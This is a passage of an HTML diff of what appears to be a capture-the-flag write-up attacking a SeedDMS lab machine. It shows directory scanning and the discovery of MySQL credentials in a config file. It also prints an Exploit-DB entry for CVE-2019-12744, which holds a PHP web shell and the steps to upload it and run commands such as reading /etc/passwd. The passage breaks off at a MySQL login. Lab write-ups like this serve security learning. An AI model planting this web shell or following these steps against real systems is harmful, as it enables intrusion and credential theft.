+<td>MySQL 8.0.25</td>
+</tr>
+<tr>
+<td>33060</td>
+<td>mysqlx</td>
+</tr>
+</tbody>
+</table>
+<p>Access the web page:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141143149.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141143149.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141143149.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141143149.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141143149.png"
+        title="image-20231114114339908" /></p>
+<p>It&rsquo;s a common web page, and find nothing.</p>
+<h3 id="3-web-directory">3. Web Directory</h3>
+<p>Well, just scan the web directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ gobuster dir -u http://172.16.86.150:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.6
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://172.16.86.150:80/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.6
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/img                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312<span class="o">]</span> <span class="o">[</span>--&gt; http://172.16.86.150/img/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312<span class="o">]</span> <span class="o">[</span>--&gt; http://172.16.86.150/css/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 311<span class="o">]</span> <span class="o">[</span>--&gt; http://172.16.86.150/js/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314<span class="o">]</span> <span class="o">[</span>--&gt; http://172.16.86.150/fonts/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Progress: <span class="m">220560</span> / <span class="m">220561</span> <span class="o">(</span>100.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Just find some common directory.</p>
+<p>Look into <code>js</code> directory, maybe we can find some userful js file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ gobuster dir -u http://172.16.86.150:80/js/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .js,.txt -t <span class="nv">60</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.6
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://172.16.86.150:80/js/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">60</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.6
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:              js,txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/main.js              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2997<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/plugins.js           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 126889<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/vendor               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 318<span class="o">]</span> <span class="o">[</span>--&gt; http://172.16.86.150/js/vendor/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Progress: <span class="m">661680</span> / <span class="m">661683</span> <span class="o">(</span>100.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see a <code>vendor</code> directory and <code>main.js</code> and <code>plugins.js</code>. Access them, and can find something useful in <code>main.js</code>:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141148581.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141148581.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141148581.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141148581.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141148581.png"
+        title="image-20231114114838434" /></p>
+<p>We got a path named <code>/seeddms51x/seeddms-5.1.22/</code>, access it:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141149029.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141149029.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141149029.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141149029.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141149029.png"
+        title="image-20231114114923877" /></p>
+<p>Well, it looks like a CMS named  <code>SeedDMS</code> &rsquo;s login page.</p>
+<h2 id="3-exploit">3. Exploit</h2>
+<p>Search exploit about SeedDMS:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudosearchsploit -t seeddms
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl"> Exploit Title                                                                                                                                                                                                              <span class="p">|</span>  Path
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Seeddms 5.1.10 - Remote Command Execution <span class="o">(</span>RCE<span class="o">)</span> <span class="o">(</span>Authenticated<span class="o">)</span>                                                                                                                                                             <span class="p">|</span> php/webapps/50062.py
+</span></span><span class="line"><span class="cl">SeedDMS 5.1.18 - Persistent Cross-Site Scripting                                                                                                                                                                            <span class="p">|</span> php/webapps/48324.txt
+</span></span><span class="line"><span class="cl">SeedDMS &lt; 5.1.11 - <span class="s1">&#39;out.GroupMgr.php&#39;</span> Cross-Site Scripting                                                                                                                                                                  <span class="p">|</span> php/webapps/47024.txt
+</span></span><span class="line"><span class="cl">SeedDMS &lt; 5.1.11 - <span class="s1">&#39;out.UsrMgr.php&#39;</span> Cross-Site Scripting                                                                                                                                                                    <span class="p">|</span> php/webapps/47023.txt
+</span></span><span class="line"><span class="cl">SeedDMS versions &lt; 5.1.11 - Remote Command Execution                                                                                                                                                                        <span class="p">|</span> php/webapps/47022.txt
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Shellcodes: No Results
+</span></span><span class="line"><span class="cl">Papers: No Results
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ searchsploit -x php/webapps/47022.txt
+</span></span><span class="line"><span class="cl">  Exploit: SeedDMS versions &lt; 5.1.11 - Remote Command Execution
+</span></span><span class="line"><span class="cl">      URL: https://www.exploit-db.com/exploits/47022
+</span></span><span class="line"><span class="cl">     Path: /usr/share/exploitdb/exploits/php/webapps/47022.txt
+</span></span><span class="line"><span class="cl">    Codes: CVE-2019-12744
+</span></span><span class="line"><span class="cl"> Verified: False
+</span></span><span class="line"><span class="cl">File Type: ASCII text
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ cat /usr/share/exploitdb/exploits/php/webapps/47022.txt
+</span></span><span class="line"><span class="cl"><span class="c1"># Exploit Title: [Remote Command Execution through Unvalidated File Upload in SeedDMS versions &lt;5.1.11]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Google Dork: [NA]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Date: [20-June-2019]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Exploit Author: [Nimit Jain](https://www.linkedin.com/in/nimitiitk)(https://secfolks.blogspot.com)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Vendor Homepage: [https://www.seeddms.org]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Software Link: [https://sourceforge.net/projects/seeddms/files/]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Version: [SeedDMS versions &lt;5.1.11] (REQUIRED)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Tested on: [NA]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># CVE : [CVE-2019-12744]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Exploit Steps:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Step 1: Login to the application and under any folder add a document.
+</span></span><span class="line"><span class="cl">Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PHP Backdoor Code:
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])){</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;&lt;pre&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$cmd</span> <span class="o">=</span> <span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        system<span class="o">(</span><span class="nv">$cmd</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;&lt;/pre&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        die<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Step 3: Now after uploading the file check the document id corresponding to the document.
+</span></span><span class="line"><span class="cl">Step 4: Now go to example.com/data/1048576/<span class="s2">&#34;document_id&#34;</span>/1.php?cmd<span class="o">=</span>cat+/etc/passwd to get the <span class="nb">command</span> response in browser.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Note: Here <span class="s2">&#34;data&#34;</span> and <span class="s2">&#34;1048576&#34;</span> are default folders where the uploaded files are getting saved.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If we want to use the exploit, we need to login the website. But we have no passwd now.</p>
+<h3 id="1-scan-the-web-path">1. Scan the web path</h3>
+<p>We has found a url path named <code>/seeddms51x/seeddms-5.1.22/</code>, so we can scan it now:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ gobuster dir -u http://172.16.86.150/seeddms51x/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -t <span class="nv">60</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.6
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://172.16.86.150/seeddms51x/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">60</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.6
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/data                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 324<span class="o">]</span> <span class="o">[</span>--&gt; http://172.16.86.150/seeddms51x/data/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/www                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 323<span class="o">]</span> <span class="o">[</span>--&gt; http://172.16.86.150/seeddms51x/www/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/conf                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 324<span class="o">]</span> <span class="o">[</span>--&gt; http://172.16.86.150/seeddms51x/conf/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/pear                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 324<span class="o">]</span> <span class="o">[</span>--&gt; http://172.16.86.150/seeddms51x/pear/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Progress: <span class="m">220560</span> / <span class="m">220561</span> <span class="o">(</span>100.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Well, we found a <code>conf</code>, keep scanning:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ gobuster dir -u http://172.16.86.150/seeddms51x/conf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x .txt,.conf,.xml,.php-t <span class="nv">60</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.6
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://172.16.86.150/seeddms51x/conf
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.6
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:              txt,conf,xml,php-t
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/settings.xml         <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 12377<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Progress: <span class="m">1102800</span> / <span class="m">1102805</span> <span class="o">(</span>100.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Well, we can find mysql username and password in <code>settings.xml</code> file:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141929656.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141929656.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141929656.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141929656.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141929656.png"
+        title="image-20231114192921392" /></p>
+<h3 id="2-login-to-mysql">2. Login to mysql</h3>
+<p>We use the username and password login to mysql, and look for something useful:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ mysql -u seeddms -h 172.16.86.150 -p
+</span></span><span class="line"><span class="cl">Enter password:
+</span></span><span class="line"><span class="cl">Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
+</span></span><span class="line"><span class="cl">Your MySQL connection id is <span class="m">8</span>
+</span></span><span class="line"><span class="cl">Server version: 8.0.25-0ubuntu0.20.04.1 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+</span></span><span class="line"><span class="cl">
